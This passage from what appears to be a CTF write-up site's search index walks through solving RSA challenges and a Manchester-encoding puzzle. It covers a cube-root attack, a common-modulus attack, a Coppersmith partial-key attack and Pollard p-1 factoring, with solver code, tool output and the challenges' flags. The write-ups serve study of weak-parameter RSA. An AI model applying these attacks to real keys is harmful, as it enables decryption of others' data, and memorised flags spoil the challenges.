Prng","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/ciscn_rsa/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee\u63d0\u4f9b\u4e86 RSA \u52a0\u5bc6\u90e8\u5206\u4ee3\u7801\u4ee5\u53ca\u8f93\u51fa\uff0c\u660e\u6587\u88ab\u62c6\u6210\u4e86\u4e09\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from flag import text , flag import md5 from Crypto.Util.number import long_to_bytes , bytes_to_long , getPrime assert md5 . new ( text ) . hexdigest () == flag [ 6 : - 1 ] msg1 = text [: xx ] msg2 = text [ xx : yy ] msg3 = text [ yy :] msg1 = bytes_to_long ( msg1 ) msg2 = bytes_to_long ( msg2 ) msg3 = bytes_to_long ( msg3 ) p1 = getPrime ( 512 ) q1 = getPrime ( 512 ) N1 = p1 * q1 e1 = 3 print pow ( msg1 , e1 , N1 ) print ( e1 , N1 ) p2 = getPrime ( 512 ) q2 = getPrime ( 512 ) N2 = p2 * q2 e2 = 17 e3 = 65537 print pow ( msg2 , e2 , N2 ) print pow ( msg2 , e3 , N2 ) print ( e2 , N2 ) print ( e3 , N2 ) p3 = getPrime ( 512 ) q3 = getPrime ( 512 ) N3 = p3 * q3 print pow ( msg3 , e3 , N3 ) print ( e3 , N3 ) print p3 >> 200 \u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb \u00b6 \u7b2c\u4e00\u90e8\u5206\u52a0\u5bc6\uff0c \\(e1\\) \u53ea\u6709 \\(3\\) \uff0c\u5c5e\u4e8e\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb \u76f4\u63a5\u4f7f\u7528\u5de5\u5177 Ganapati/RsaCtfTool Cube-Root \u653b\u51fb 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ./RsaCtfTool.py -e 3 -n 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009 --uncipher 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893 --attack cube_root private argument is not set, the private key will not be displayed, even if recovered. [ * ] Testing key /tmp/tmp_l5kh68w. [ * ] Performing cube_root attack on /tmp/tmp_l5kh68w. Results for /tmp/tmp_l5kh68w: Unciphered data : HEX : 0x200a4f2077696c6420576573742057696e642c2074686f7520627265617468206f6620417574756d INT ( big endian ) : 267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157 INT ( little endian ) : 913291388310064586979227686933669644206016064403638123402129058189456441650304517698024417200672 STR : b ' \\nO wild West Wind, thou breath of Autum' \u5171\u6a21\u653b\u51fb \u00b6 \u7b2c\u4e8c\u90e8\u5206\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u6a21\u6570 \\(n\\) \uff0c\u4e0d\u540c\u7684 \\(e\\) \u5bf9\u540c\u4e00\u6bb5\u6587\u672c\u8fdb\u884c\u52a0\u5bc6 \u4f7f\u7528\u5de5\u5177 Ganapati/RsaCtfTool \u7684\u5171\u6a21\u653b\u51fb\uff08same_n_huge_e\uff09\uff0c e \u4e0e\u5bc6\u6587\u5728\u987a\u5e8f\u4e0a\u9700\u8981\u5bf9\u5e94 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ./RsaCtfTool.py -e 17 ,65537 -n 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977 --uncipher 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610 ,91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950 --attack same_n_huge_e private argument is not set, the private key will not be displayed, even if recovered. [ * ] Multikey mode using keys: /tmp/tmpdgzqh3f2, /tmp/tmp9fa7r378 [ * ] Performing same_n_huge_e attack. Results for /tmp/tmpdgzqh3f2,/tmp/tmp9fa7r378: Unciphered data : HEX : 0x6e2773206265696e672c0a54686f752c2066726f6d2077686f736520756e7365656e2070726573656e636520746865206c656176657320646561640a4172652064726976656e2c206c696b652067686f7374732066726f6d20616e20656e6368616e74657220666c6565696e672c0a59656c6c6f772c2061 INT ( big endian ) : 4193305853284549103821195807609492624095031428085219879448342104337322945001387680236011960472296815293233144303730273979905837762067652913308898433728800864776794638198055607422503065410595894676740531680367227696622352026247676452540064020322619036125381146346603655445487695574824919137 INT ( little endian ) : 3697344670341776042819034986158075076536873171472590072336800110388597776652983023588023111158079096754137966151154403318011693149935108642418525130993932032045777394368194102308289062036168961367389701205240426686201519457468290650177310915303466740807866707603445131602629565993519884142 STR : b \"n's being,\\nThou, from whose unseen presence the leaves dead\\nAre driven, like ghosts from an enchanter fleeing,\\nYellow, a\" [ * ] Testing key /tmp/tmpdgzqh3f2. [ * ] Testing key /tmp/tmp9fa7r378. \u5df2\u77e5 P \u7684\u9ad8\u4f4d\u653b\u51fb\uff08Coppersmith \u653b\u51fb\uff09 \u00b6 \u7b2c\u4e09\u90e8\u5206\u5df2\u77e5 P \u7684\u9ad8\u4f4d\uff0c\u4e3a\u79c1\u94a5\u7684\u4e00\u90e8\u5206\uff0c\u800c\u5de5\u5177 Ganapati/RsaCtfTool \u4e3b\u8981\u4e13\u6ce8\u4e8e\u516c\u94a5\u653b\u51fb\uff0c\u5c1a\u672a\u5b9e\u73b0\u653b\u51fb partial_q \u4f7f\u7528 SageMath 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # sage n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147 c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646 p = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902 e = 65537 pbits = 512 # p \u7684\u539f\u59cb\u957f\u5ea6 kbits = pbits - p . nbits () p = p << kbits print ( \"upper %d bits (of %d bits) is given\" % ( pbits - kbits , pbits )) PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p x0 = f . small_roots ( X = 2 ^ kbits , beta = 0.4 )[ 0 ] # \u591a\u9879\u5f0f\u5c0f\u503c\u6839\u6c42\u89e3\u53ca\u56e0\u5b50\u5206\u89e3 p = p + int ( x0 ) fn = ( p - 1 ) * ( n / p - 1 ) text = pow ( c , inverse_mod ( e , fn ), n ) hex_str = hex ( text ) print ( hex_str ) print ( bytes . fromhex ( hex_str [ 2 :])) \u83b7\u5f97\u8f93\u51fa 1 2 3 upper 312 bits ( of 512 bits ) is given 0x6e6420626c61636b2c20616e642070616c652c20616e6420686563746963207265642c0a50657374696c656e63652d73747269636b656e206d756c746974756465733a204f2074686f752c0a57686f2063686172696f7465737420746f207468656972206461726b2077696e747279206265640a b 'nd black, and pale, and hectic red,\\nPestilence-stricken multitudes: O thou,\\nWho chariotest to their dark wintry bed\\n' \u62fc\u63a5\u5404\u90e8\u5206\u7ed3\u679c\u518d MD5 \u5373\u53ef\u83b7\u5f97 Flag \u53c2\u8003\u8d44\u6599 \u00b6 Dense univariate polynomials over Z/nZ , implemented using NTL","title":"CISCN - rsa"},{"location":"crypto/ciscn_rsa/#_1","text":"\u9898\u76ee\u63d0\u4f9b\u4e86 RSA \u52a0\u5bc6\u90e8\u5206\u4ee3\u7801\u4ee5\u53ca\u8f93\u51fa\uff0c\u660e\u6587\u88ab\u62c6\u6210\u4e86\u4e09\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from flag import text , flag import md5 from Crypto.Util.number import long_to_bytes , bytes_to_long , getPrime assert md5 . new ( text ) . hexdigest () == flag [ 6 : - 1 ] msg1 = text [: xx ] msg2 = text [ xx : yy ] msg3 = text [ yy :] msg1 = bytes_to_long ( msg1 ) msg2 = bytes_to_long ( msg2 ) msg3 = bytes_to_long ( msg3 ) p1 = getPrime ( 512 ) q1 = getPrime ( 512 ) N1 = p1 * q1 e1 = 3 print pow ( msg1 , e1 , N1 ) print ( e1 , N1 ) p2 = getPrime ( 512 ) q2 = getPrime ( 512 ) N2 = p2 * q2 e2 = 17 e3 = 65537 print pow ( msg2 , e2 , N2 ) print pow ( msg2 , e3 , N2 ) print ( e2 , N2 ) print ( e3 , N2 ) p3 = getPrime ( 512 ) q3 = getPrime ( 512 ) N3 = p3 * q3 print pow ( msg3 , e3 , N3 ) print ( e3 , N3 ) print p3 >> 200","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/ciscn_rsa/#_2","text":"\u7b2c\u4e00\u90e8\u5206\u52a0\u5bc6\uff0c \\(e1\\) \u53ea\u6709 \\(3\\) \uff0c\u5c5e\u4e8e\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb \u76f4\u63a5\u4f7f\u7528\u5de5\u5177 Ganapati/RsaCtfTool Cube-Root \u653b\u51fb 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ./RsaCtfTool.py -e 3 -n 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009 --uncipher 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893 --attack cube_root private argument is not set, the private key will not be displayed, even if recovered. [ * ] Testing key /tmp/tmp_l5kh68w. [ * ] Performing cube_root attack on /tmp/tmp_l5kh68w. Results for /tmp/tmp_l5kh68w: Unciphered data : HEX : 0x200a4f2077696c6420576573742057696e642c2074686f7520627265617468206f6620417574756d INT ( big endian ) : 267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157 INT ( little endian ) : 913291388310064586979227686933669644206016064403638123402129058189456441650304517698024417200672 STR : b ' \\nO wild West Wind, thou breath of Autum'","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb"},{"location":"crypto/ciscn_rsa/#_3","text":"\u7b2c\u4e8c\u90e8\u5206\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u6a21\u6570 \\(n\\) \uff0c\u4e0d\u540c\u7684 \\(e\\) \u5bf9\u540c\u4e00\u6bb5\u6587\u672c\u8fdb\u884c\u52a0\u5bc6 \u4f7f\u7528\u5de5\u5177 Ganapati/RsaCtfTool \u7684\u5171\u6a21\u653b\u51fb\uff08same_n_huge_e\uff09\uff0c e \u4e0e\u5bc6\u6587\u5728\u987a\u5e8f\u4e0a\u9700\u8981\u5bf9\u5e94 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ./RsaCtfTool.py -e 17 ,65537 -n 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977 --uncipher 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610 ,91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950 --attack same_n_huge_e private argument is not set, the private key will not be displayed, even if recovered. [ * ] Multikey mode using keys: /tmp/tmpdgzqh3f2, /tmp/tmp9fa7r378 [ * ] Performing same_n_huge_e attack. Results for /tmp/tmpdgzqh3f2,/tmp/tmp9fa7r378: Unciphered data : HEX : 0x6e2773206265696e672c0a54686f752c2066726f6d2077686f736520756e7365656e2070726573656e636520746865206c656176657320646561640a4172652064726976656e2c206c696b652067686f7374732066726f6d20616e20656e6368616e74657220666c6565696e672c0a59656c6c6f772c2061 INT ( big endian ) : 4193305853284549103821195807609492624095031428085219879448342104337322945001387680236011960472296815293233144303730273979905837762067652913308898433728800864776794638198055607422503065410595894676740531680367227696622352026247676452540064020322619036125381146346603655445487695574824919137 INT ( little endian ) : 3697344670341776042819034986158075076536873171472590072336800110388597776652983023588023111158079096754137966151154403318011693149935108642418525130993932032045777394368194102308289062036168961367389701205240426686201519457468290650177310915303466740807866707603445131602629565993519884142 STR : b \"n's being,\\nThou, from whose unseen presence the leaves dead\\nAre driven, like ghosts from an enchanter fleeing,\\nYellow, a\" [ * ] Testing key /tmp/tmpdgzqh3f2. [ * ] Testing key /tmp/tmp9fa7r378.","title":"\u5171\u6a21\u653b\u51fb"},{"location":"crypto/ciscn_rsa/#p-coppersmith","text":"\u7b2c\u4e09\u90e8\u5206\u5df2\u77e5 P \u7684\u9ad8\u4f4d\uff0c\u4e3a\u79c1\u94a5\u7684\u4e00\u90e8\u5206\uff0c\u800c\u5de5\u5177 Ganapati/RsaCtfTool \u4e3b\u8981\u4e13\u6ce8\u4e8e\u516c\u94a5\u653b\u51fb\uff0c\u5c1a\u672a\u5b9e\u73b0\u653b\u51fb partial_q \u4f7f\u7528 SageMath 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # sage n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147 c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646 p = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902 e = 65537 pbits = 512 # p \u7684\u539f\u59cb\u957f\u5ea6 kbits = pbits - p . nbits () p = p << kbits print ( \"upper %d bits (of %d bits) is given\" % ( pbits - kbits , pbits )) PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p x0 = f . small_roots ( X = 2 ^ kbits , beta = 0.4 )[ 0 ] # \u591a\u9879\u5f0f\u5c0f\u503c\u6839\u6c42\u89e3\u53ca\u56e0\u5b50\u5206\u89e3 p = p + int ( x0 ) fn = ( p - 1 ) * ( n / p - 1 ) text = pow ( c , inverse_mod ( e , fn ), n ) hex_str = hex ( text ) print ( hex_str ) print ( bytes . fromhex ( hex_str [ 2 :])) \u83b7\u5f97\u8f93\u51fa 1 2 3 upper 312 bits ( of 512 bits ) is given 0x6e6420626c61636b2c20616e642070616c652c20616e6420686563746963207265642c0a50657374696c656e63652d73747269636b656e206d756c746974756465733a204f2074686f752c0a57686f2063686172696f7465737420746f207468656972206461726b2077696e747279206265640a b 'nd black, and pale, and hectic red,\\nPestilence-stricken multitudes: O thou,\\nWho chariotest to their dark wintry bed\\n' \u62fc\u63a5\u5404\u90e8\u5206\u7ed3\u679c\u518d MD5 \u5373\u53ef\u83b7\u5f97 Flag","title":"\u5df2\u77e5 P \u7684\u9ad8\u4f4d\u653b\u51fb\uff08Coppersmith \u653b\u51fb\uff09"},{"location":"crypto/ciscn_rsa/#_4","text":"Dense univariate polynomials over Z/nZ , implemented using NTL","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/code_modulate/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u7ed9\u4e86\u4e00\u4e32\u5bc6\u6587 2559659965656A9A65656996696965A6695669A9695A699569666A5A6A6569666A59695A69AA696569666AA6 \u548c\u4e00\u5f20\u63d0\u793a\u56fe\u7247 \u56fe\u7247\u91cc\u662f 01 \u4e32\uff0c\u4e0d\u7ba1\u600e\u4e48\u8bf4\u5148\u628a\u5bc6\u6587\u6309\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u5427\uff01 1 0010010101011001011001011001100101100101011001010110101010011010011001010110010101101001100101100110100101101001011001011010011001101001010101100110100110101001011010010101101001101001100101010110100101100110011010100101101001101010011001010110100101100110011010100101100101101001010110100110100110101010011010010110010101101001011001100110101010100110 \u63a5\u7740\uff0c\u662f\u56fe\u7247\u91cc\u6700\u660e\u663e\u7684 Manchester \u7f16\u7801\u7684\u89e3\u7801\u3002\u6709\u70b9\u5947\u602a\uff0c\u6709\u4e00\u4f4d\u6ca1\u89e3\u51fa\u6765\uff1f(\u03a6\u02cb\u03c9\u02ca\u03a6)\u95ee\u9898\u4e0d\u5927\uff0c\u53cd\u6b63\u53ea\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u8981\u4e48\u662f 0\uff0c\u8981\u4e48\u662f 1 1 ?1000010010010100100010001111011010001000110100101100110010011010110000101101110011000110110100001100101011100110111010001100101011100100110001101101111011001000110010101111101 \u5f53\u7b2c\u4e00\u4f4d\u586b 0 \u65f6\uff0c\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u518d\u5bf9\u5e94\u5230 ASCII \u7801\u53ef\u5f97 Flag\uff1a BJD{DifManchestercode}","title":"\u7f16\u7801\u4e0e\u8c03\u5236"},{"location":"crypto/code_modulate/#_1","text":"\u7ed9\u4e86\u4e00\u4e32\u5bc6\u6587 2559659965656A9A65656996696965A6695669A9695A699569666A5A6A6569666A59695A69AA696569666AA6 \u548c\u4e00\u5f20\u63d0\u793a\u56fe\u7247 \u56fe\u7247\u91cc\u662f 01 \u4e32\uff0c\u4e0d\u7ba1\u600e\u4e48\u8bf4\u5148\u628a\u5bc6\u6587\u6309\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u5427\uff01 1 0010010101011001011001011001100101100101011001010110101010011010011001010110010101101001100101100110100101101001011001011010011001101001010101100110100110101001011010010101101001101001100101010110100101100110011010100101101001101010011001010110100101100110011010100101100101101001010110100110100110101010011010010110010101101001011001100110101010100110 \u63a5\u7740\uff0c\u662f\u56fe\u7247\u91cc\u6700\u660e\u663e\u7684 Manchester \u7f16\u7801\u7684\u89e3\u7801\u3002\u6709\u70b9\u5947\u602a\uff0c\u6709\u4e00\u4f4d\u6ca1\u89e3\u51fa\u6765\uff1f(\u03a6\u02cb\u03c9\u02ca\u03a6)\u95ee\u9898\u4e0d\u5927\uff0c\u53cd\u6b63\u53ea\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u8981\u4e48\u662f 0\uff0c\u8981\u4e48\u662f 1 1 ?1000010010010100100010001111011010001000110100101100110010011010110000101101110011000110110100001100101011100110111010001100101011100100110001101101111011001000110010101111101 \u5f53\u7b2c\u4e00\u4f4d\u586b 0 \u65f6\uff0c\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u518d\u5bf9\u5e94\u5230 ASCII \u7801\u53ef\u5f97 Flag\uff1a BJD{DifManchestercode}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/cycling/","tags":["rsa","carmichael function","pollard's p\u22121 algorithm"],"text":"#rsa #carmichael function #pollard's p\u22121 algorithm .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 It is well known that any RSA encryption can be undone by just encrypting the ciphertext over and over again. If the RSA modulus has been chosen badly then the number of encryptions necessary to undo an encryption is small. However, if the modulus is well chosen then a cycle attack can take much longer. This property can be used for a timed release of a message. We have confirmed that it takes a whopping 2^1025-3 encryptions to decrypt the flag. Pack out your quantum computer and perform 2^1025-3 encryptions to solve this challenge. Good luck doing this in 48h. chall.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #!/usr/bin/python3 # Copyright 2022 Google LLC \"\"\" It is well known that any RSA encryption can be undone by just encrypting the ciphertext over and over again. If the RSA modulus has been chosen badly then the number of encryptions necessary to undo an encryption is small. If n = 0x112b00148621 then only 209 encryptions are necessary as the following example demonstrates: >>> e = 65537 >>> n = 0x112b00148621 >>> pt = 0xdeadbeef >>> # Encryption >>> ct = pow(pt, e, n) >>> # Decryption via cycling: >>> pt = ct >>> for _ in range(209): >>> pt = pow(pt, e, n) >>> # Assert decryption worked: >>> assert ct == pow(pt, e, n) However, if the modulus is well chosen then a cycle attack can take much longer. This property can be used for a timed release of a message. We have confirmed that it takes a whopping 2^1025-3 encryptions to decrypt the flag. Pack out your quantum computer and perform 2^1025-3 encryptions to solve this challenge. Good luck doing this in 48h. \"\"\" e = 65537 n = 0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1 ct = 0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680 # Decryption via cycling: pt = ct for _ in range ( 2 ** 1025 - 3 ): pt = pow ( pt , e , n ) # Assert decryption worked: assert ct == pow ( pt , e , n ) # Print flag: print ( pt . to_bytes (( pt . bit_length () + 7 ) // 8 , 'big' ) . decode ()) \u89e3\u9898\u601d\u8def \u00b6 \u5df2\u77e5\u76ee\u6807\u5bc6\u6587\u5fc5\u987b\u518d\u7ecf\u8fc7 \\(2^{1025}-3\\) \u6b21\u52a0\u5bc6\u540e\u624d\u80fd\u83b7\u5f97\u660e\u6587\u3002\u4ee4 \\(R=2^{1025}-2\\) \uff08\u6885\u68ee\u6570\u7684 \\(2\\) \u500d\uff09\uff0c\u90a3\u4e48\u6709 \\(x^{e^{R}}\\equiv x\\ (mod\\ n)\\) \u6b27\u62c9\u51fd\u6570 \\(\\varphi(n)\\) \u80fd\u591f\u6c42\u51fa\u6ee1\u8db3 \\(a^m\\equiv 1\\ (mod\\ n)\\) \uff08 \\(a\\) \u5c0f\u4e8e \\(n\\) \u4e14\u4e0e \\(n\\) \u4e92\u8d28\uff09 \u7684\u6b63\u6574\u6570\uff0c\u4f46\u4e0d\u4e00\u5b9a\u662f\u6700\u5c0f\u7684\uff0c\u5361\u8fc8\u514b\u5c14\u51fd\u6570 \\(\\lambda(n)\\) \u7684\u7ed3\u679c\u624d\u662f\u3002\u90a3\u4e48\u6709 \\(x^{\\lambda(n)}\\equiv 1\\ (mod\\ n),\\ x^{e^R}\\equiv x\\equiv (x^{\\lambda(n)})^k x\\ (mod\\ n)\\) \uff0c\u80fd\u591f\u63a8\u51fa \\(e^R\\equiv 1\\ mod\\ \\lambda(n)\\) \uff0c\u7531\u6b64\u53ef\u77e5 \\(\\lambda(\\lambda(n))|R\\) \u8bbe \\(\\lambda(n)=\\prod_{i=1}^k s_i^{r_i}\\) \uff0c\u90a3\u4e48 \\(\\lambda(\\lambda(n))=lcm(\\lambda(s_1^{r_1}),\\lambda(s_2^{r_2}),\\dotsb,\\lambda(s_k^{r_k}))=\\) \\(lcm(s_1^{r_1-1}(s_1-1),s_2^{r_2-1}(s_2-1),\\dotsb,s_k^{r_k-1}(s_k-1))\\) \uff0c\u6839\u636e \\(R\\) \u7684\u8d28\u56e0\u6570\u5206\u89e3\u7ed3\u679c\u63a8\u6d4b\u6240\u6709\u8d28\u56e0\u6570\u6307\u6570\u4e0d\u5927\u4e8e \\(1\\) \uff0c\u5219 \\(\\lambda(\\lambda(n))=lcm(s_1-1,s_2-1,\\dotsb,s_k-1)\\) \u6839\u636e Pollard \u7684 \\(p-1\\) \u8d28\u56e0\u6570\u5206\u89e3\u7b97\u6cd5\uff0c\u53ef\u4ee5\u9009\u62e9\u4e0e \\(n\\) \u4e92\u8d28\u7684\u4efb\u610f\u6574\u6570 \\(a\\) \uff0c\u8ba1\u7b97 \\(g=gcd((a^{M}-1\\ mod\\ n), n)\\) \u6765\u5206\u89e3 \\(n\\) \\(p\\) \u662f \\(n\\) \u7684\u4e00\u4e2a\u8d28\u56e0\u6570\uff0c\u82e5 \\(p-1\\) \u7684\u6bcf\u4e00\u4e2a\u56e0\u6570 \\(s\\) \u90fd\u6ee1\u8db3 \\(s\\le B\\) \uff08 \\(B\\) \u4eba\u4e3a\u9009\u5b9a\uff09\uff0c\u663e\u7136\u6709 \\((p-1)|B!\\) \uff0c \\(M\\) \u5b9a\u4e49\u4e3a \\(\\prod_{primes\\ s\\le B}s^{\\lfloor log_s B\\rfloor}\\) \uff0c\u82e5 \\(g=1\\) \u6216 \\(g=n\\) \u5219\u91cd\u65b0\u9009\u62e9 \\(B\\) \u8fdb\u884c\u8ba1\u7b97 \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6709 \\(a^{k(p-1)}\\equiv 1\\ (mod\\ p)\\) \u82e5\u4e00\u4e2a\u6570 \\(x\\) \u6a21 \\(p\\) \u4f59 \\(1\\) \uff0c\u90a3\u4e48 \\(p|gcd(x-1,n)\\) \\(\\lambda(\\lambda(n))=\\lambda(lcm(p-1,q-1))=\\lambda(s_1s_2\\dotsb s_k)=lcm(s_1-1,s_2-1,\\dotsb,s_k-1)\\) \uff0c\u663e\u7136\uff0c \\((s_i-1)|R\\) \uff0c\u90a3\u4e48\u53ef\u7531 \\(R\\) \u8d28\u56e0\u6570\u5206\u89e3\u7ed3\u679c\u5f97\u51fa \\(s_i\\) \u7684\u5019\u9009\u96c6\uff0c\u5373 \\(p-1\\) \u548c \\(q-1\\) \u7684\u8d28\u56e0\u6570\u5019\u9009\u96c6\uff0c\u7ed3\u5408 Pollard \u7684 \\(p-1\\) \u8d28\u56e0\u6570\u5206\u89e3\u7b97\u6cd5\u8fdb\u884c\u6c42\u89e3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from factordb.factordb import FactorDB from sympy import isprime from math import gcd from Crypto.Util.number import long_to_bytes def factor_n ( primes ): m = 2 for p in primes : m = pow ( m , p , n ) g = gcd ( m - 1 , n ) if 1 < g < n : return g , n // g e = 65537 n = 0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1 ct = 0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680 R = 2 * ( 2 ** 1024 - 1 ) f = FactorDB ( R ) f . connect () factors = f . get_factor_list () prods = { 1 } for f in factors : prods |= { f * x for x in prods } primes = [ p + 1 for p in prods if isprime ( p + 1 )] p , q = factor_n ( primes ) d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) m = pow ( ct , d , n ) print ( long_to_bytes ( m )) Flag \u00b6 CTF{Recycling_Is_Great} \u53c2\u8003\u8d44\u6599 \u00b6 Intended Solution Carmichael function - Wikipedia Pollard's p \u2212 1 algorithm - 